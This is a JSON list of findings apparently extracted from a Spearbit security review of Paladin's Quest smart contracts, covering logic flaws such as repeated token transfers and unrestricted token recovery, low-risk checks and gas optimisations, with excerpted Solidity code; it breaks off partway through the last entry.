[
    {
        "title": "Verify user has indeed voted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "If an error is made in the merkle trees (either by accident or on purpose) a user that did not vote (in that period for that gauge) might get rewards assigned to him. Although the Paladin documentation says: \"the Curve DAO contract does not offer a mapping of votes for each Gauge for each Period\", it might still be possible to verify that a user has voted if the account, gauge and period are known. Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens could be sent / withdrawn multiple times by accident",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Functions closeQuestPeriod() and closePartOfQuestPeriod() have similar functionality but in- terfere with each other. 1. Suppose you have closed the first quest of a period via closePartOfQuestPeriod(). Now you cannot use closeQuestPeriod() to close the rest of the periods, as closeQuestPeriod() checks the state of the first quest. 2. Suppose you have closed the second quest of a period via closePartOfQuestPeriod(), but closeQuest- Period() continues to work. It will close the second quest again and send the rewards of the second quest to the distributor, again. Also, function closeQuestPeriod() sets the withdrawableAmount value one more time, so the creator can do withdrawUnusedRewards() once more. Although both closeQuestPeriod() and closePartOfQuestPeriod() are authorized, the problems above could occur by accident. Additionally there is a lot of code duplication between closeQuestPeriod() and closePartOfQuestPeriod(), with a high risk of issues with future code changes. 5 function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... // We use the 1st QuestPeriod of this period to check it was not Closed uint256[] memory questsForPeriod = questsByPeriod[period]; require( ,! periodsByQuest[questsForPeriod[0]][period].currentState == PeriodState.ACTIVE, // only checks first period \"QuestBoard: Period already closed\" ); ... // no further checks on currentState _questPeriod.withdrawableAmount = .... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // sends tokens (again) ... } // sets withdrawableAmount (again) function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ,! ... _questPeriod.currentState = PeriodState.CLOSED; ... _questPeriod.withdrawableAmount = _questPeriod.rewardAmountPerPeriod - toDistributeAmount; IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); ... } Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Limit possibilities of recoverERC20()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function recoverERC20() in contract MultiMerkleDistributor.sol allows the retrieval of all ERC20 tokens from the MultiMerkleDistributor.sol whereas the comment indicates it is only meant to retrieve those tokens that have been sent by mistake. Allowing to retrieve all tokens also enables the retrieval of legitimate ones. This way rewards cannot be collected anymore. It could be seen as allowing a rug pull by the project and should be avoided. In contrast, function recoverERC20() in contract QuestBoard.sol does prevent whitelisted tokens from being re- trieved. Note: The project could also add a merkle tree that allows for the retrieval of legitimate tokens to their own addresses. 6 * @notice Recovers ERC2O tokens sent by mistake to the contract contract MultiMerkleDistributor is Ownable { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; } } contract QuestBoard is Ownable, ReentrancyGuard { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Updating QuestBoard in MultiMerkleDistributor.sol will not work",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Updating QuestManager/ QuestBoard in MultiMerkleDistributor.sol will give the following issue: If the newQuestBoard uses the current implementation of QuestBoard.sol, it will start with questId == 0 again, thus attempting to overwrite previous quests. function updateQuestManager(address newQuestBoard) external onlyOwner { questBoard = newQuestBoard; }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Old quests can be extended via increaseQuestDuration()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function increaseQuestDuration() does not check if a quest is already in the past. Extending a quest from the past in duration is probably not useful. It also might require additional calls to closePartOfQuest- Period(). function increaseQuestDuration(...) ... { updatePeriod(); ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... uint256 periodIterator = ((lastPeriod + WEEK) / WEEK) * WEEK; ... for(uint256 i = 0; i < addedDuration;){ ... periodsByQuest[questID][periodIterator]....= ... periodIterator = ((periodIterator + WEEK) / WEEK) * WEEK; unchecked{ ++i; } } ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Accidental call of addQuest could block contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The addQuest() function uses an onlyAllowed access control modifier. This modifier checks if msg.sender is questBoard or owner. However, the QuestBoard.sol contract has a QuestID registration and a token whitelisting mechanism which should be used in combination with addQuest() function. If owner accidentally calls addQuest(), the QuestBoard.sol contract will not be able to call addQuest() for that questID. As soon as createQuest() tries to add that same questID the function will revert, becoming uncallable because nextID still maintains that same value. function createQuest(...) ... { ... uint256 newQuestID = nextID; nextID += 1; ... require(MultiMerkleDistributor(distributor).addQuest(newQuestID, rewardToken), \"QuestBoard: Fail add to Distributor\"); ... ,! } 8 function addQuest(uint256 questID, address token) external onlyAllowed returns(bool) { require(questRewardToken[questID] == address(0), \"MultiMerkle: Quest already listed\"); require(token != address(0), \"MultiMerkle: Incorrect reward token\"); // Add a new Quest using the QuestID, and list the reward token for that Quest questRewardToken[questID] = token; emit NewQuest(questID, token); return true; } Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Reduce impact of emergencyUpdatequestPeriod()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function emergencyUpdatequestPeriod() allows the merkle tree to be updated. The merkle tree contains an embedded index parameter which is used to prevent double claims. When the merkleRoot is updated, the layout of indexes in the merkle tree could become different. Example: Suppose the initial merkle tree contains information for: - user A: index=1, account = 0x1234, amount=100 - user B: index=2, account = 0x5689, amount=200 Then user A claims => _setClaimed(..., 1) is set. Now it turns out a mistake is made with the merkle tree, and it should contain: - user B: index=1, account = 0x5689, amount=200 - user C: index=2, account = 0xabcd, amount=300 Now user B will not be able to claim because bit 1 has already been set. Under this situation the following issues can occur:  Someone who has already claimed might be able to claim again.  Someone who has already claimed has too much.  Someone who has already claimed has too little, and cannot longer claim the rest because _setClaimed() has already been set.  someone who has not yet claimed might not be able to claim because _setClaimed() has already been set by another user. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Verify the correct merkle tree is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The MultiMerkleDistributor.sol contract does not verify that the merkle tree belongs to the right quest and period. If the wrong merkle tree is added then the wrong rewards can be claimed. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Prevent mixing rewards from different quests and periods",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The MultiMerkleDistributor.sol contract does not verify that the sum of all amounts in the merkle tree are equal to the rewards allocated for that quest and for that period. This could happen if there is a bug in the merkle tree creation script. If the sum of the amounts is too high, then tokens from other quests or other periods could be claimed, which will give problems later on, when claims are done for the other quest/periods. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Nonexistent zero address check for newQuestBoard in updateQuestManager function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Nonexistent zero address check for newQuestBoard in updateQuestManager function. Assigning newQuestBoard to a zero address may cause unintended behavior.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify period is always a multiple of week",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The calculations with period assume that period is a multiple of WEEK. However, period is often assigned as a parameter and not verified if it is a multiple of WEEK. This calculation may cause unexpected results. Note: When it is verified that period is a multiple of WEEK, the following calculation can be simplified: - int256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; + int256 nextPeriod = period + WEEK; The following function does not explicitly verify that period is a multiple of WEEK. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... uint256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; ... } function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { ... } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) ... { ... } function addMerkleRoot(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function addMultipleMerkleRoot(..., uint256 period, ...) external isAlive onlyAllowed nonReentrant { ... } ,! function claim(..., uint256 period, ...) public { ... } function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function claimQuest(address account, uint256 questID, ClaimParams[] calldata claims) external { ,! ... // also uses period as part of the claims array require(questMerkleRootPerPeriod[claims[i].questID][claims[i].period] != 0, \"MultiMerkle: not updated yet\"); require(!isClaimed(questID, claims[i].period, claims[i].index), \"MultiMerkle: already claimed\"); ... require( MerkleProof.verify(claims[i].merkleProof, questMerkleRootPerPeriod[questID][claims[i].period], ,! node), \"MultiMerkle: Invalid proof\" ); ... _setClaimed(questID, claims[i].period, claims[i].index); ... emit Claimed(questID, claims[i].period, claims[i].index, claims[i].amount, rewardToken, account); ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk QuestBoard.sol#L201-L203, QuestBoard.sol#L750-L815,"
        ]
    },
    {
        "title": "Missing safety check to ensure array length does not underflow and revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Several functions use questPeriods[questID][questPeriods[questID].length - 1]. The sec- ond value in the questPeriods mapping is questPeriods[questID].length - 1. It is possible for this function to revert if the case arises where questPeriods[questID].length is 0. Looking at the code this is not likely to occur but it is a valid safety check that covers possible strange edge cases. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestDuration(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestReward(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestObjective(... ) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent dual entry point tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Function recoverERC20() in contract QuestBoard.sol only allows the retrieval of non whitelisted tokens. Recently an issue has been found to circumvent these checks, with so called dual entry point tokens. See a description here: compound-tusd-integration-issue-retrospective function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } 13",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit the creation of quests",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The function getQuestIdsForPeriod() could run out of gas if someone creates an enormous amount of quests. See also: what-is-the-array-size-limit-of-a-returned-array. Note: If this were to happen, the QuestIds can also be retrieved directly from the getter of questsByPeriod(). Note: closeQuestPeriod() has the same problem, but closePartOfQuestPeriod() is a workaround for this. Requiring a minimal amount of tokens to create a quest can limit the number of quests. The minimum number of tokens to pay is: duration * minObjective * minRewardPerVotePerToken[]. The values of duration and minObjective are least 1, but minRewardPerVotePerToken[] could be 0 and even if minRewardPerVotePerToken is non zero but still low, the number of tokes required is neglectable when using tokens with 18 decimals. Requiring a minimum amount of tokens also helps to prevent the creation of spam quests. 14 function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { return questsByPeriod[period]; // could run out of gas } function createQuest(...) { ... require(duration > 0, \"QuestBoard: Incorrect duration\"); require(objective >= minObjective, \"QuestBoard: Objective too low\"); ... require(rewardPerVote >= minRewardPerVotePerToken[rewardToken], \"QuestBoard: RewardPerVote too low\"); ... vars.rewardPerPeriod = (objective * rewardPerVote) / UNIT; // can be 0 ==> totalRewardAmount can be 0 require((totalRewardAmount * platformFee)/MAX_BPS == feeAmount, \"QuestBoard: feeAmount incorrect\"); // feeAmount can be 0 ... require((vars.rewardPerPeriod * duration) == totalRewardAmount, \"QuestBoard: totalRewardAmount incorrect\"); ... IERC20(rewardToken).safeTransferFrom(vars.creator, address(this), totalRewardAmount); IERC20(rewardToken).safeTransferFrom(vars.creator, questChest, feeAmount); ... ,! ,! ,! ,! } constructor(address _gaugeController, address _chest){ ... minObjective = 1000 * UNIT; // initial value, but can be overwritten ... } function updateMinObjective(uint256 newMinObjective) external onlyOwner { require(newMinObjective > 0, \"QuestBoard: Null value\"); // perhaps set higher minObjective = newMinObjective; } function whitelistToken(address newToken, uint256 minRewardPerVote) public onlyAllowed { // geen isAlive??? ... minRewardPerVotePerToken[newToken] = minRewardPerVote; // no minimum value required ... ,! }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Non existing states are considered active",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "periods- if a state is checked of a non existing However, ByQuest[questIDs[i]][period] is active. questIDs[i] or a questID that has no quest in that period, then periodsByQuest[questIDs[i]][period] is empty and periodsByQuest[questIDs[i]][period].currentState == 0. closePartOfQuestPeriod() function verifies state the of if As PeriodState.ACTIVE ==0, the stated is considered to be active and the require() doesnt trigger and pro- cessing continues. Luckily as all other values are also 0 (especially _questPeriod.rewardAmountPerPeriod), toDistributeAmount will be 0 and no tokens are sent. However slight future changes in the code might introduce unwanted effects. enum PeriodState { ACTIVE, CLOSED, DISTRIBUTED } // ACTIVE == 0 function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive ,! onlyAllowed nonReentrant { ... for(uint256 i = 0; i < length;){ ... require( periodsByQuest[questIDs[i]][period].currentState == PeriodState.ACTIVE, // doesn't work ,! if questIDs[i] & period are empty \"QuestBoard: Period already closed\" );",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Critical changes should use two-step process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The QuestBoard.sol, QuestTreasureChest.sol and QuestTreasureChest.sol contracts inherit from OpenZeppelins Ownable contract which enables the onlyOwner role to transfer ownership to another address. Its possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. This is an unwanted situation because the owner role is neccesary for several methods.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent accidental call of emergencyUpdatequestPeriod()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Functions updateQuestPeriod() and emergencyUpdatequestPeriod() are very similar. However, if function emergencyUpdatequestPeriod() is accidentally used instead of updateQuestPeriod(), then period isnt push()ed to the array questClosedPeriods[]. This means function getClosedPeriodsByQuests() will not be able to retreive all the closed periods. function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyAllowed returns(bool) { ... questClosedPeriods[questID].push(period); ... questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyOwner returns(bool) { ... // no push() questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Usage of deprecated safeApprove",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "OpenZeppelin safeApprove implementation is deprecated. Reference. Using this deprecated func- tion can lead to unintended reverts and potential locking of funds. SafeERC20.safeApprove() Insecure Behaviour.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "questID on the NewQuest event should be indexed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The NewQuest event currently does not have questID set to indexed which goes against the pattern set by the other events in the contract where questID is actually indexed.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add validation checks on addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Missing validation checks on addresses passed into the constructor functions. Adding these checks on _gaugeController and _chest can prevent costly errors the during deployment of the contract. Also in function claim() and claimQuest() there is no zero check for for account argument.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Changing public constant variables to non-public can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Several constants are public and thus have a getter function. called from the outside, therefore it is not necessary to make them public. It is unlikely for these values to be",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Using uint instead of bool to optimize gas usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "A bool is more costly than uint256. Because each write action generates an additional SLOAD to read the contents of the slot, change the bits occupied by bool and finally write back. contract BooleanTest { mapping(address => bool) approvedManagers; // Gas Cost : 44144 function approveManager(address newManager) external{ approvedManagers[newManager] = true; } mapping(address => uint256) approvedManagersWithoutBoolean; // Gas Cost : 44069 function approveManagerWithoutBoolean(address newManager) external{ approvedManagersWithoutBoolean[newManager] = 1; } }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize && operator usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The check && consumes more gas than using multiple require statements. Example test can be seen below: //Gas Cost: 22515 function increaseQuestReward(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 feeAmount) ,! public { require(newRewardPerVote != 0 && addedRewardAmount != 0 && feeAmount != 0, \"QuestBoard: Null ,! amount\"); } //Gas Cost: 22477 function increaseQuestRewardTest(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 ,! feeAmount) public { require(newRewardPerVote != 0, \"QuestBoard: Null amount\"); require(addedRewardAmount != 0, \"QuestBoard: Null amount\"); require(feeAmount != 0, \"QuestBoard: Null amount\"); } Note : It costs more gas to deploy but it is worth it after X calls. Trade-offs should be considered.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecesary value set to 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Since all default values in solidity are already 0 it riod.rewardAmountDistributed = 0; here as it should already be 0. is unnecessary to include _questPe-",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize unsigned integer comparison",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Check != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled. While it may seem that > 0 is cheaper than !=0 this is only true without the optimizer being enabled and outside a require statement. If the optimizer is enabled at 10k and it is in a require statement, it would be more gas efficient.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use memory instead of storage in closeQuestPeriod() and closePartOfQuestPeriod()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "In functions closeQuestPeriod() and closePartOfQuestPeriod() a storage pointer _quest is set to quests[questsForPeriod[i]]. This is normally used when write access to the location is need. Nevertheless _quest is read only, to a copy of quests[questsForPeriod[i]] is also sufficient. This can save some gas. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questsForPeriod[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questIDs[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! ,! }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Revert string size optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met. Revert strings using more than 32 bytes require at least one additional mstore, along with additional operations for computing memory offset.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize withdrawUnusedRewards() and emergencyWithdraw() with pointers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "ByQuest[questID][_questPeriods[i]] several times. pointer to read and update values. This will save gas and also make the code more readable. periods- It is possible to set a pointer to this record and use that withdrawUnusedRewards() emergencyWithdraw() Functions and use function withdrawUnusedRewards(uint256 questID, address recipient) external isAlive nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState == PeriodState.ACTIVE) { ... } ... uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } ... } function emergencyWithdraw(uint256 questID, address recipient) external nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState != PeriodState.ACTIVE){ uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } } else { .. totalWithdraw += periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod; periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod = 0; } ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Needless to initialize variables with default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "uint256 variables are initialized to a default value of 0 per Solidity docs. Setting a variable to the default value is unnecessary.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize the calculation of the currentPeriod",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The retrieval of currentPeriod is relatively gas expensive because it requires an SLOAD instruction (100 gas) every time. Calculating (block.timestamp / WEEK) * WEEK; is cheaper (TIMESTAMP: 2 gas, MUL: 5 gas, DIV: 5 gas). Refer to evm.codes for more information. Additionally, there is a risk that the call to updatePeriod() is forgotten although it does not happen in the current code. function updatePeriod() public { if (block.timestamp >= currentPeriod + WEEK) { currentPeriod = (block.timestamp / WEEK) * WEEK; } } Note: it is also possible to do all calculations with (block.timestamp / WEEK) instead of (block.timestamp / WEEK) * WEEK, but as the Paladin project has indicated:\"\" This currentPeriod is a timestamp, showing the start date of the current period, and based from the Curve system (because we want the same timestamp they have in the GaugeController).\"",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change memory to calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "For the function parameters, it is often more optimal to have the reference location to be calldata instead of memory. Changing bytes to calldata will decrease gas usage. OpenZeppelin Pull Request",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Caching array length at the beginning of function can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Caching array length at the beginning of the function can save gas in the several locations. function multiClaim(address account, ClaimParams[] calldata claims) external { require(claims.length != 0, \"MultiMerkle: empty parameters\"); uint256 length = claims.length; // if this is done before the require, the require can use \"length\" ... }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Check amount is greater than 0 to avoid calling safeTransfer() unnecessarily",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "A check should be added to make sure amount is greater than 0 to avoid calling safeTransfer() unnecessarily.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unchecked{++i} is more efficient than i++",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The function getAllQuestPeriodsForQuestId uses i++ which costs more gas than ++i, especially in a loop. Also, the createQuest function uses nextID += 1 which costs more gas than ++nextID. Finally the initialization of i = 0 can be skipped, as 0 is the default value.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Could replace claims[i].questID with questID",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Could replace claims[i].questID with questID (as they are equal due to the check above)",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change function visibility from public to external",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The function updateRewardToken of the QuestBoard contract could be set external to save gas and improve code quality.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functions isClaimed() and _setClaimed() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The functions isClaimed() and _setClaimed() of the contract MultiMerkleDistributor can be optimized to save gas. See OZ BitMaps for inspiration.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Missing events for owner only functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use nonReentrant modifier in a consistent way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "The functions claim(), claimQuest() and recoverERC20() of contract MultiMerkleDistributor send tokens but dont have a nonReentrant modifier. All other functions that send tokens do have this modifier. Note: as the checks & effects patterns is used this is not really necessary. function claim(...) public { ... IERC20(rewardToken).safeTransfer(account, amount); } function claimQuest(...) external { ... IERC20(rewardToken).safeTransfer(account, totalClaimAmount); } function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; }",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Place struct definition at the beginning of the contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
        "body": "Regarding Solidity Style Guide, the struct definition can move to the beginning of the contract.",
        "labels": [
            "Spearbit",
            "Paladin",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve checks for past quests in increaseQuestReward() and increaseQuestObjective()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf",
